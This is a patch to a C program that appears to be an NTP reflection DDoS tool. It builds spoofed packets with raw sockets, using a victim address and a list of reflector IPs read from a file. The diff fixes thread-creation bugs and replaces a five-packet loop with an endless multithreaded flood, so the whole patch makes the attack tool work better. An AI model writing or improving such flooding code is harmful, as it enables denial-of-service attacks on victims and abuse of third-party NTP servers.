@@ -49,11 +49,12 @@ unsigned int victim_inet_addr = 0;
 int is_random_victim_port = -1; //-1 is false,otherwise true;
 int thread_count = 0;
 char *reflect_file = NULL;
+unsigned int ip_list_size = 0;
 
-void send_ntp(in_addr_t *ip_list, int size) {
+void send_ntp(in_addr_t ip_list[]) {
     // 随机数种子
-    srand((unsigned int) time(0));
-    int cur_index = abs((int) random()) % size;
+//    srand((unsigned int) time(0));
+    int cur_index = abs((int) random()) % ip_list_size;
 
     // 创建一个可以构造首部数据的 raw_socket
     int send_socket = -1;
@@ -102,7 +103,7 @@ void send_ntp(in_addr_t *ip_list, int size) {
     struct pseudo_header *psh = (struct pseudo_header *) pseudogram;
 
     int j = 0;
-    for (j = 0; j < 5; j++) {
+    for (;;) {
         dest.sin_addr.s_addr = ip_list[cur_index];
 
 //        char datagram[datagram_size];
@@ -173,7 +174,7 @@ void send_ntp(in_addr_t *ip_list, int size) {
         }
 
         cur_index++;
-        if (cur_index == size) {
+        if (cur_index == ip_list_size) {
             cur_index = 0;
         }
     }
@@ -237,6 +238,7 @@ int main(int argc, char *argv[]) {
     }
 
     unsigned int line_count = get_file_line_count(reflect_file);
+    ip_list_size = line_count;
     printf("\n一共有%d行ip地址\n", line_count);
 
     in_addr_t ip_list[line_count];
@@ -264,13 +266,12 @@ int main(int argc, char *argv[]) {
     int k;
     for (k = 0; k < thread_count; k++) {
         //第一个参数tid，第二个参数线程param，一般传NULL，第三个参数，方法指针，第四个参数，方法的参数列表，如果没有参数就传NULL
-        pthread_create(&tids[j], NULL, (void *) send_ntp, (void *) line_count);
+        pthread_create(&tids[k], NULL, (void *) send_ntp, (void *) ip_list);
     }
-    for (j = 0; j < thread_count; j++) {
-        pthread_join(tids[j], NULL);
+    for (k = 0; k < thread_count; k++) {
+        pthread_join(tids[k], NULL);
     }
 
-    send_ntp(ip_list, line_count);
     // sockfd should close here !
     return 0;
 }
